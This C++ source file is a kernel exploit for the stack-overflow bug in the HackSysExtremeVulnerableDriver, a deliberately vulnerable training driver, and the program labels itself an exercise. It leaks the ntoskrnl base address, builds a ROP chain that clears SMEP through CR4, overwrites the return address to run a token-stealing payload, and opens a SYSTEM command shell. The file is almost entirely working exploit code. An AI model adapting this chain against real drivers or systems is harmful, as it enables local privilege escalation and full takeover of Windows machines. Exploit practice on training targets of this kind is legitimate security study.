#include <iostream>
#include <Windows.h>
#include <Psapi.h>

extern "C" VOID StealToken(void);

#define DEVICE_NAME L"\\\\.\\HackSysExtremeVulnerableDriver"

HANDLE GetDeviceHandle()
{
    HANDLE hRet = NULL;
    hRet = CreateFile(
        DEVICE_NAME,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
        NULL
    );

    if (hRet == INVALID_HANDLE_VALUE) {
        std::cout << "Error open device with error code" << GetLastError() << std::endl;
    }

    return hRet;
}

VOID TriggerStackOverFlow(DWORD dwCTLCode) {
    LPVOID addresses[1000];
    DWORD needed;

    EnumDeviceDrivers(addresses, 1000, &needed);
    std::cout << "[+] Address of ntoskrnl.exe: " << std::hex << addresses[0] << std::endl;

    LPVOID ntoskrnl = addresses[0];
    LPVOID mov_cr4_rcx = (LPVOID)((INT_PTR)ntoskrnl + 0x41f8fd);         // mov cr4, rcx, ret
    LPVOID pop_rcx = (LPVOID)((INT_PTR)ntoskrnl + 0x15fc70);         // pop rcx, ret

    std::cout << "[+] Address of mov cr4, rcx: " << std::hex << mov_cr4_rcx << std::endl;
    std::cout << "[+] Address of pop rcx:      " << std::hex << pop_rcx << std::endl;

    HANDLE hDev = GetDeviceHandle();
    if (!hDev)
        return;
    std::cout << "[+] Got Device Handle :" << std::hex << hDev << std::endl;

    DWORD dwSize = 0x838;
    DWORD dwRetSize = 0;
    PVOID PayloadAddr = &StealToken;
    PULONG64 RetAddrArray = NULL;
    CHAR *Buffer = (CHAR *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
    if (!Buffer)
        return;
    RtlFillMemory(Buffer, dwSize, 'A');

    RetAddrArray = (PULONG64)&Buffer[0x818];
    RetAddrArray[0] = (ULONG64)pop_rcx;
    RetAddrArray[1] = 0x70678;
    RetAddrArray[1] = 0x506f8;
    RetAddrArray[2] = (ULONG64)mov_cr4_rcx;
    RetAddrArray[3] = (ULONG64)PayloadAddr;

    OutputDebugString(L"[+] ==========  Kernel Mode   ============ [+]");

    if (DeviceIoControl(
        hDev,
        dwCTLCode,
        Buffer,
        dwSize,
        NULL,
        0,
        &dwRetSize,
        NULL
    )) {
        std::cout << "[+] Done! Got systerm shell \n\n";
        system("cmd.exe");
    }
    else {
        std::cout << "...try again \n\n";
    }

    OutputDebugString(L"[+] ========== IOCTL Finished =========== [+] ");

    std::cout << "Finished Send IOCTL" << std::endl;
    HeapFree(GetProcessHeap(), 0, Buffer);
    Buffer = NULL;
}

int main()
{
    std::cout << "[+] Exercise: Stack OverFlow";
    TriggerStackOverFlow(0x222003);

    return 0;
}